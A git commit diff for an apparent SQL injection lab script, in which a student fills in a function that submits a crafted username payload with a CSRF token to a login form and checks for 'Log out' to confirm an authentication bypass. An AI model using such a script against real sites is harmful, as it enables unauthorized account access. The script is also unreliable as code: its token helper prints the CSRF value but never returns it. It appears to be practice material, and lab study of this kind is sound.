fe8ece3b4d72e2c4f76382e5827fd93dcec61534
Sebastian Castillo <tantrum5535@gmail.com>
2023-11-09 16:23:35 -0300

    sql injection lab 2

--- sqlinjection2.py
+++ sqlinjection2.py
@@ -5,17 +5,25 @@ from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
 
 def get_csrf_token(s, url):
     r = s.get(url, verify=False, proxies=proxies )
     soup = BeautifulSoup(r.text, 'html.parser')
-    csrf = soup.fing("input")['value']
+    csrf = soup.find("input")['value']
     print(csrf)
 
 def exploit_sqli(s, url, payload):
     csrf = get_csrf_token(s, url)
-    
+    data = {"csrf": csrf,
+            "username": payload,
+            "password": "randomtext"}
+    r = s.post(url, data=data, verify=False, proxies=proxies)
+    res = r.text
+    if "Log out" in res:
+        return True
+    else:
+        return False
 
 if __name__ == "__main__":
     try:
